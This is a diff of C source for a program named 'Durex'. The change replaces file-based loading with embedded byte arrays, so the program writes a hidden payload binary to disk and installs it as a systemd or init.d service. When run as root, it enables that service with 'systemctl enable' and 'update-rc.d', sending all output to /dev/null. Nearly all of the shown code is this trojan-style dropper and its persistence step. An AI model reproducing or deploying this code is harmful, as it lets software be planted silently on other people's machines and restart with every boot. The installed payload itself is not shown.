@@ -12,32 +12,6 @@
 
 #include "../includes/durex.h"
 
-static int read_obj(char *file_name, void **obj, size_t *obj_size)
-{
-	int payload_fd;
-
-	if ((payload_fd = open(file_name, O_RDONLY)) < 0)
-	{
-		(DEBUG) ? printf("Error %d opening '%s' file.\n", payload_fd, file_name) : 0;
-		return (-1);
-	}
-	if ((*obj_size = lseek(payload_fd, (size_t)0, SEEK_END)) <= 0)
-	{
-		(DEBUG) ? printf("Error empty '%s' file\n", file_name) : 0;
-		close(payload_fd);
-		return (-1);
-	}
-	if ((*obj = mmap(0, *obj_size, PROT_READ, MAP_PRIVATE, payload_fd, 0)) == \
-			MAP_FAILED)
-	{
-		(DEBUG) ? printf("Error mapping '%s' file\n", file_name) : 0;
-		close(payload_fd);
-		return (-1);
-	}
-	close(payload_fd);
-	return 0;
-}
-
 static int create_file()
 {
 	// creates a Durex file
@@ -45,24 +19,11 @@ static int create_file()
 
 	if ((durex_fd = open(BIN_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
 	{
-		(DEBUG) ? printf("Error %d creating 'Durex' file.\n", durex_fd) : 0;
-		return (-1);
-	}
-	// read payload content
-	void *obj = NULL;
-	size_t obj_size = 0;
-	// read payload
-	// TODO use hardcoded code
-	if (read_obj(PAYLOAD_SRC, &obj, &obj_size))
-	{
-		close(durex_fd);
+		if (DEBUG) printf("Error %d creating 'Durex' file.\n", durex_fd);
 		return (-1);
 	}
 	// write content
-	write(durex_fd, obj, obj_size);
-	// tmp
-	if (munmap(obj, obj_size) < 0)
-		(DEBUG) ? printf("Error munmap\n") : 0;
+	write(durex_fd, payload_payload, payload_payload_len);
 	close(durex_fd);
 	return 0;
 }
@@ -70,25 +31,13 @@ static int create_file()
 static int init_d()
 {
 	int init_fd = 0;
-	void *obj = NULL;
-	size_t obj_size = 0;
 
 	if ((init_fd = open(SYSTEMD_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0644)) < 0)
 	{
 		return -1;
 	}
-	// read init file content
-	// TODO use hardcoded code
-	if (read_obj(SYSTEMD_SRC, &obj, &obj_size))
-	{
-		close(init_fd);
-		return -1;
-	}
 	// write content
-	write(init_fd, obj, obj_size);
-	// tmp
-	if (munmap(obj, obj_size) < 0)
-		(DEBUG) ? printf("Error munmap\n") : 0;
+	write(init_fd, service_system_d, service_system_d_len);
 	close(init_fd);
 	// reload systemd
 	system("systemctl enable Durex.service 1>/dev/null 2>/dev/null");
@@ -100,18 +49,8 @@ static int init_d()
 		{
 			return -1;
 		}
-		// read init file content
-		// TODO use hardcoded code
-		if (read_obj(INITD_SRC, &obj, &obj_size))
-		{
-			close(init_fd);
-			return -1;
-		}
 		// write content
-		write(init_fd, obj, obj_size);
-		// tmp
-		if (munmap(obj, obj_size) < 0)
-			(DEBUG) ? printf("Error munmap\n") : 0;
+		write(init_fd, service_init_d, service_init_d_len);
 		close(init_fd);
 		// reload initd
 		system("update-rc.d Durex defaults 1>/dev/null 2>/dev/null");
@@ -132,7 +71,7 @@ int main(void)
 	}
 	else
 	{
-		(DEBUG) ? printf("Insufficient Permissions, please re-run as root.\n") : 0;
+		if (DEBUG) printf("Insufficient Permissions, please re-run as root.\n");
 	}
 	return 0;
 }
